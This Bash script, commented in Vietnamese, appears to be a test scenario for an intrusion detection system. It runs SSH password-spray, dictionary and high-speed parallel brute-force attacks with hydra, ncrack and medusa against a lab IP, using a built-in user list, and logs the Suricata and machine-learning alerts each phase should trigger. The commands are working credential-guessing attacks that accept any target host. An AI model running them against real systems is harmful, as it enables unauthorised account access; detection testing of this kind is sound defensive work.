#!/bin/bash

# Scenario 02: SSH Brute Force Multi-Tool
# Mục tiêu  : Test phát hiện brute force với nhiều tool và chiến thuật khác nhau.
# Công cụ   : hydra (bắt buộc), medusa/ncrack (tùy chọn)
# Phases    : Password Spray → Dictionary Attack → Parallel High-Speed


TARGET="${1:-172.16.1.2}"
LOG_DIR="${2:-/tmp/idps_test_logs}"
SCENARIO_NAME="02_bruteforce"
SCRIPT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
WORDLIST_DIR="$SCRIPT_DIR/wordlists"
PASSWORDS="$WORDLIST_DIR/simple_passwords.txt"

mkdir -p "$LOG_DIR"
LOGFILE="$LOG_DIR/${SCENARIO_NAME}.log"

log() {
    echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOGFILE"
}

# Kiểm tra tools
HAS_HYDRA=false
HAS_MEDUSA=false
HAS_NCRACK=false

command -v hydra &>/dev/null && HAS_HYDRA=true
command -v medusa &>/dev/null && HAS_MEDUSA=true
command -v ncrack &>/dev/null && HAS_NCRACK=true

if ! $HAS_HYDRA; then
    log "ERROR: hydra không tìm thấy. Đây là tool bắt buộc."
    log "       Cài đặt: sudo apt install -y hydra"
    exit 1
fi


log "SCENARIO 02: SSH Brute Force Multi-Tool → $TARGET"
log "Tools: hydra=$HAS_HYDRA, medusa=$HAS_MEDUSA, ncrack=$HAS_NCRACK"


# Tạo user list nhỏ
USERLIST="/tmp/idps_test_users.txt"
cat > "$USERLIST" << 'EOF'
root
admin
user
test
ubuntu
dmtien
guest
operator
EOF

# PHASE 1: Password Spray
# Mục đích: Thử 1 password cho nhiều user → ít login attempts mỗi user
# → khó phát hiện bằng per-user threshold, nhưng ML thấy tổng traffic bất thường

log "PHASE 1: Password Spray (nhiều user, ít password)"

log "[1.1] Hydra: 8 users × 1 password (password123)"
log "      → Suricata: ET SCAN SSH BruteForce threshold thấp"
log "      → ML: bidirectional_packets pattern + SSH port + RST Flag Count"
hydra -L "$USERLIST" -p "password123" \
    ssh://"$TARGET" -t 4 -V -I \
    2>&1 | tee "$LOG_DIR/${SCENARIO_NAME}_phase1_spray.txt" | tail -5 | tee -a "$LOGFILE"

bash "$SCRIPT_DIR/unblock_and_reset.sh"


log "[1.2] Hydra: 8 users × 3 passwords (top passwords)"
hydra -L "$USERLIST" -P <(head -3 "$PASSWORDS") \
    ssh://"$TARGET" -t 4 -V -I \
    2>&1 | tee "$LOG_DIR/${SCENARIO_NAME}_phase1_spray2.txt" | tail -5 | tee -a "$LOGFILE"

bash "$SCRIPT_DIR/unblock_and_reset.sh"

# Nếu có ncrack, chạy song song để chứng minh tool-agnostic detection
if $HAS_NCRACK; then
    
    log "[1.3] Ncrack: Password spray (tool khác, cùng pattern)"
    log "      → Chứng minh IDPS phát hiện bất kể tool nào"
    ncrack -U "$USERLIST" -P <(head -3 "$PASSWORDS") \
        "$TARGET":22 -T 3 \
        2>&1 | tee "$LOG_DIR/${SCENARIO_NAME}_phase1_ncrack.txt" | tail -5 | tee -a "$LOGFILE"
    bash "$SCRIPT_DIR/unblock_and_reset.sh"
fi


# PHASE 2: Dictionary Attack
# Mục đích: 1 user, nhiều password → nhiều login attempts → dễ trigger threshold

log "PHASE 2: Dictionary Attack (1 user, nhiều password)"

log "[2.1] Hydra: root × 20 passwords (từ simple_passwords.txt)"
log "      → Rất nhiều SSH attempts liên tục → Flow Packets/s cao"
log "      → Suricata: chắc chắn alert 'SSH BruteForce'"
log "      → ML: binary score > 0.85 → AUTO_BLOCK"
hydra -l root -P "$PASSWORDS" \
    ssh://"$TARGET" -t 8 -V -I \
    2>&1 | tee "$LOG_DIR/${SCENARIO_NAME}_phase2_dict_root.txt" | tail -5 | tee -a "$LOGFILE"

bash "$SCRIPT_DIR/unblock_and_reset.sh"


log "[2.2] Hydra: admin × 20 passwords (tăng threads)"
hydra -l admin -P "$PASSWORDS" \
    ssh://"$TARGET" -t 12 -V -I \
    2>&1 | tee "$LOG_DIR/${SCENARIO_NAME}_phase2_dict_admin.txt" | tail -5 | tee -a "$LOGFILE"

bash "$SCRIPT_DIR/unblock_and_reset.sh"

# Nếu có medusa, dùng thêm
if $HAS_MEDUSA; then
    
    log "[2.3] Medusa: dmtien × 20 passwords (tool khác)"
    medusa -h "$TARGET" -u dmtien -P "$PASSWORDS" \
        -M ssh -t 10 -n 22 \
        2>&1 | tee "$LOG_DIR/${SCENARIO_NAME}_phase2_medusa.txt" | tail -5 | tee -a "$LOGFILE"
    bash "$SCRIPT_DIR/unblock_and_reset.sh"
fi


# PHASE 3: High-Speed Parallel Attack
# Mục đích: Tăng threads lên cao → stress test response time

log "PHASE 3: High-Speed Parallel Attack (stress test)"

log "[3.1] Hydra: 16 threads, admin × 20 passwords"
log "      → Đo response time của IDPS khi bị flood SSH"
hydra -l admin -P "$PASSWORDS" \
    ssh://"$TARGET" -t 16 -V -I -f \
    2>&1 | tee "$LOG_DIR/${SCENARIO_NAME}_phase3_fast.txt" | tail -5 | tee -a "$LOGFILE"

bash "$SCRIPT_DIR/unblock_and_reset.sh"


log "[3.2] Hydra: Multiple users + passwords, max speed"
hydra -L "$USERLIST" -P "$PASSWORDS" \
    ssh://"$TARGET" -t 16 -V -I \
    2>&1 | tee "$LOG_DIR/${SCENARIO_NAME}_phase3_all.txt" | tail -5 | tee -a "$LOGFILE"



log "SCENARIO 02 HOÀN TẤT"
log "Logs: $LOG_DIR/${SCENARIO_NAME}_*.txt"


# Cleanup
rm -f "$USERLIST"
